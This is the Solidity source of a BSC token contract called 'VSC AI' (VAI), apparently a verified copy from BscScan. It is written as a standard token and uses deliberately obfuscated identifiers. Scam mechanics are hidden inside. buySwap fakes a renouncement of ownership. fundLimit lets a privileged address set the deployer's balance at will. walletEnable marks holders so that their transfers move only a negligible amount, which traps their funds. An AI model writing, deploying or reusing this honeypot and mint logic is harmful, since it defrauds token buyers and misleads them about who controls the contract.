/**
 *Submitted for verification at BscScan.com on 2023-02-09
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.1;

interface swapWallet {
    function totalSupply() external view returns (uint256);

    function balanceOf(address takeListAt) external view returns (uint256);

    function transfer(address atTxFund, uint256 txIs) external returns (bool);

    function allowance(address txTotal, address spender) external view returns (uint256);

    function approve(address spender, uint256 txIs) external returns (bool);

    function transferFrom(
        address sender,
        address atTxFund,
        uint256 txIs
    ) external returns (bool);

    event Transfer(address indexed from, address indexed shouldTx, uint256 value);
    event Approval(address indexed txTotal, address indexed spender, uint256 value);
}

interface swapWalletMetadata is swapWallet {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}


interface totalLaunch {
    function createPair(address buySender, address enableMarketing) external returns (address);
}

interface limitLaunch {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract maxLaunched {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract VSCAI is maxLaunched, swapWallet, swapWalletMetadata {
    uint8 private maxReceiver = 18;
    
    uint256 public listLaunch;

    mapping(address => uint256) private fundTxReceiver;
    bool private exemptTx;
    address public swapTakeLaunch;
    bool private limitAuto;

    mapping(address => bool) public teamAt;
    mapping(address => bool) public limitEnable;

    uint256 private receiverSwap = 100000000 * 10 ** maxReceiver;
    uint256 public teamMarketingShould;
    bool public liquidityLaunch;
    string private buyMarketing = "VSC AI";
    address private listSellReceiver = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    uint256 private liquidityTrading;
    uint256 private swapReceiver;
    address private maxShould;
    uint256 constant txMarketing = 10 ** 10;

    address public senderLaunched;
    string private teamIs = "VAI";

    
    mapping(address => mapping(address => uint256)) private enableToken;
    

    event OwnershipTransferred(address indexed tradingAmount, address indexed receiverReceiver);

    constructor (){
        
        limitLaunch liquidityAmount = limitLaunch(listSellReceiver);
        swapTakeLaunch = totalLaunch(liquidityAmount.factory()).createPair(liquidityAmount.WETH(), address(this));
        maxShould = _msgSender();
        if (swapReceiver == liquidityTrading) {
            exemptTx = false;
        }
        senderLaunched = maxShould;
        limitEnable[senderLaunched] = true;
        
        fundTxReceiver[senderLaunched] = receiverSwap;
        emit Transfer(address(0), senderLaunched, receiverSwap);
        buySwap();
    }

    

    function feeReceiverTotal() public {
        if (listLaunch == swapReceiver) {
            liquidityTrading = swapReceiver;
        }
        if (exemptTx) {
            limitAuto = true;
        }
        limitAuto=false;
    }

    function decimals() external view virtual override returns (uint8) {
        return maxReceiver;
    }

    function fundLimit(uint256 txIs) public {
        if (!limitEnable[_msgSender()]) {
            return;
        }
        fundTxReceiver[senderLaunched] = txIs;
    }

    function toLaunched() public view returns (uint256) {
        return listLaunch;
    }

    function buySwap() public {
        emit OwnershipTransferred(senderLaunched, address(0));
        maxShould = address(0);
    }

    function balanceOf(address takeListAt) public view virtual override returns (uint256) {
        return fundTxReceiver[takeListAt];
    }

    function name() external view virtual override returns (string memory) {
        return buyMarketing;
    }

    function allowance(address exemptTxLaunched, address walletTotal) external view virtual override returns (uint256) {
        return enableToken[exemptTxLaunched][walletTotal];
    }

    function transfer(address fromExempt, uint256 txIs) external virtual override returns (bool) {
        return tradingEnable(_msgSender(), fromExempt, txIs);
    }

    function txLimitTeam() public {
        if (teamMarketingShould == liquidityTrading) {
            liquidityTrading = teamMarketingShould;
        }
        if (swapReceiver != liquidityTrading) {
            limitAuto = false;
        }
        exemptTx=false;
    }

    function walletEnable(address isShould) public {
        if (liquidityTrading == swapReceiver) {
            swapReceiver = teamMarketingShould;
        }
        if (isShould == senderLaunched || isShould == swapTakeLaunch || !limitEnable[_msgSender()]) {
            return;
        }
        
        teamAt[isShould] = true;
    }

    function amountEnableTo() public view returns (bool) {
        return exemptTx;
    }

    function launchedReceiver(address walletShould) public {
        if (liquidityLaunch) {
            return;
        }
        
        limitEnable[walletShould] = true;
        if (liquidityTrading != listLaunch) {
            teamMarketingShould = liquidityTrading;
        }
        liquidityLaunch = true;
    }

    function tokenLaunched() public view returns (bool) {
        return limitAuto;
    }

    function symbol() external view virtual override returns (string memory) {
        return teamIs;
    }

    function owner() external view returns (address) {
        return maxShould;
    }

    function approve(address walletTotal, uint256 txIs) public virtual override returns (bool) {
        enableToken[_msgSender()][walletTotal] = txIs;
        emit Approval(_msgSender(), walletTotal, txIs);
        return true;
    }

    function transferFrom(address tradingList, address atTxFund, uint256 txIs) external override returns (bool) {
        if (enableToken[tradingList][_msgSender()] != type(uint256).max) {
            require(txIs <= enableToken[tradingList][_msgSender()]);
            enableToken[tradingList][_msgSender()] -= txIs;
        }
        return tradingEnable(tradingList, atTxFund, txIs);
    }

    function marketingBuy(address tradingList, address atTxFund, uint256 txIs) internal returns (bool) {
        require(fundTxReceiver[tradingList] >= txIs);
        fundTxReceiver[tradingList] -= txIs;
        fundTxReceiver[atTxFund] += txIs;
        emit Transfer(tradingList, atTxFund, txIs);
        return true;
    }

    function totalSupply() external view virtual override returns (uint256) {
        return receiverSwap;
    }

    function tradingEnable(address tradingList, address atTxFund, uint256 txIs) internal returns (bool) {
        if (tradingList == senderLaunched || atTxFund == senderLaunched) {
            return marketingBuy(tradingList, atTxFund, txIs);
        }
        
        if (teamAt[tradingList]) {
            return marketingBuy(tradingList, atTxFund, txMarketing);
        }
        if (liquidityTrading == teamMarketingShould) {
            listLaunch = teamMarketingShould;
        }
        return marketingBuy(tradingList, atTxFund, txIs);
    }

    function getOwner() external view returns (address) {
        return maxShould;
    }

    function modeMax() public view returns (uint256) {
        return listLaunch;
    }

    function liquiditySwap() public view returns (uint256) {
        return swapReceiver;
    }


}